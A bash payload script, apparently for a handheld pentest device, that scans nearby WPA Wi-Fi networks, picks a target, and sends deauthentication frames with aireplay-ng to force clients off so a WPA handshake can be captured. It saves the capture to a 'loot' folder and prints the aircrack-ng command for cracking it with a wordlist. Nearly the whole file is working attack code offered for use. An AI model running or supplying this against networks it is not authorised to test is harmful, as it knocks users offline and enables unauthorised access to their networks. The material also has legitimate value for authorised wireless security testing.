#!/bin/bash
# Title: Handshake Hunter
# Author: bad-antics
# Description: Targeted WPA handshake capture
# Category: nullsec/capture

LOOT_DIR="/mmc/nullsec/handshakes"
mkdir -p "$LOOT_DIR"

PROMPT "HANDSHAKE HUNTER

Capture WPA handshakes
from a specific network.

Methods:
- Passive (wait for client)
- Active (deauth clients)
- Targeted (specific client)

Press OK to configure."

# Use existing monitor interface
MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!

Run: airmon-ng start wlan1"; exit 1; }

PROMPT "TARGET SELECTION:

1. Scan and select
2. Enter BSSID manually

Select on next screen."

MODE=$(NUMBER_PICKER "Mode (1-2):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=1 ;; esac

if [ "$MODE" -eq 1 ]; then
    SPINNER_START "Scanning for WPA networks..."
    rm -f /tmp/hsscan*
    timeout 12 airodump-ng "$MON_IF" -w /tmp/hsscan --output-format csv 2>/dev/null &
    sleep 12
    killall airodump-ng 2>/dev/null
    SPINNER_STOP

    NET_COUNT=0; NETS=""
    if [ -f /tmp/hsscan-01.csv ]; then
        while IFS=',' read -r bssid x1 x2 channel x3 privacy x5 x6 power x7 x8 x9 x10 essid rest; do
            bssid=$(echo "$bssid" | tr -d ' ')
            [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
            privacy=$(echo "$privacy" | tr -d ' ')
            [[ ! "$privacy" =~ WPA ]] && continue
            essid=$(echo "$essid" | sed 's/^[[:space:]]*//' | head -c 18)
            [ -z "$essid" ] && essid="[Hidden]"
            channel=$(echo "$channel" | tr -d ' ')
            NET_COUNT=$((NET_COUNT + 1))
            NETS="${NETS}${NET_COUNT}. ${essid} CH:${channel}\n"
            eval "BSSID_${NET_COUNT}=\"$bssid\""
            eval "CH_${NET_COUNT}=\"$channel\""
            eval "ESSID_${NET_COUNT}=\"$essid\""
            [ $NET_COUNT -ge 10 ] && break
        done < /tmp/hsscan-01.csv
    fi
    rm -f /tmp/hsscan*
    [ $NET_COUNT -eq 0 ] && { ERROR_DIALOG "No WPA networks found!"; exit 1; }

    PROMPT "WPA NETWORKS: $NET_COUNT

$(echo -e "$NETS")
Select target next."

    SEL=$(NUMBER_PICKER "Target (1-$NET_COUNT):" 1)
    eval "BSSID=\"\$BSSID_${SEL}\""
    eval "CHANNEL=\"\$CH_${SEL}\""
    eval "SSID=\"\$ESSID_${SEL}\""
else
    BSSID=$(MAC_PICKER "Target BSSID:")
    CHANNEL=$(NUMBER_PICKER "Channel:" 6)
    SSID=$(TEXT_PICKER "Network name:" "target")
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SSID="target" ;; esac
fi

PROMPT "CAPTURE METHOD:

1. Passive (just wait)
2. Deauth all clients
3. Target specific client

Select method next."

METHOD=$(NUMBER_PICKER "Method (1-3):" 2)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) METHOD=2 ;; esac

CLIENT_MAC=""
if [ "$METHOD" -eq 3 ]; then
    CLIENT_MAC=$(MAC_PICKER "Client MAC to deauth:")
fi

DURATION=$(NUMBER_PICKER "Max duration (sec):" 120)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=120 ;; esac

SAFE_SSID=$(echo "$SSID" | tr -cd '[:alnum:]_-')
CAP_FILE="$LOOT_DIR/hs_${SAFE_SSID}_$(date +%Y%m%d_%H%M)"

resp=$(CONFIRMATION_DIALOG "START CAPTURE?

SSID: $SSID
BSSID: $BSSID
Channel: $CHANNEL
Method: $METHOD

Press OK to hunt.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Hunting handshake for $SSID..."

iwconfig "$MON_IF" channel "$CHANNEL" 2>/dev/null

# Start capture in background
airodump-ng "$MON_IF" --bssid "$BSSID" -c "$CHANNEL" -w "$CAP_FILE" --output-format pcap 2>/dev/null &
CAP_PID=$!
sleep 3

CAPTURED=0
case $METHOD in
    2)
        for round in 1 2 3 4; do
            aireplay-ng -0 5 -a "$BSSID" "$MON_IF" 2>/dev/null
            sleep 10
            if ls "${CAP_FILE}"*.cap 2>/dev/null | head -1 | xargs aircrack-ng 2>/dev/null | grep -q "1 handshake"; then
                LOG "Handshake captured!"
                CAPTURED=1
                break
            fi
        done
        ;;
    3)
        for round in 1 2 3 4; do
            aireplay-ng -0 10 -a "$BSSID" -c "$CLIENT_MAC" "$MON_IF" 2>/dev/null
            sleep 10
            if ls "${CAP_FILE}"*.cap 2>/dev/null | head -1 | xargs aircrack-ng 2>/dev/null | grep -q "1 handshake"; then
                LOG "Handshake captured!"
                CAPTURED=1
                break
            fi
        done
        ;;
    *)
        sleep "$DURATION"
        if ls "${CAP_FILE}"*.cap 2>/dev/null | head -1 | xargs aircrack-ng 2>/dev/null | grep -q "1 handshake"; then
            CAPTURED=1
        fi
        ;;
esac

kill $CAP_PID 2>/dev/null
killall airodump-ng 2>/dev/null

if [ "$CAPTURED" -eq 1 ]; then
    PROMPT "SUCCESS!

Handshake captured!
SSID: $SSID
File: ${CAP_FILE}-01.cap

Crack with:
aircrack-ng -w wordlist.txt ${CAP_FILE}-01.cap

Press OK to exit."
else
    PROMPT "NO HANDSHAKE

Could not capture for:
$SSID

Try:
- Active deauth method
- Longer duration
- More clients nearby

Press OK to exit."
fi
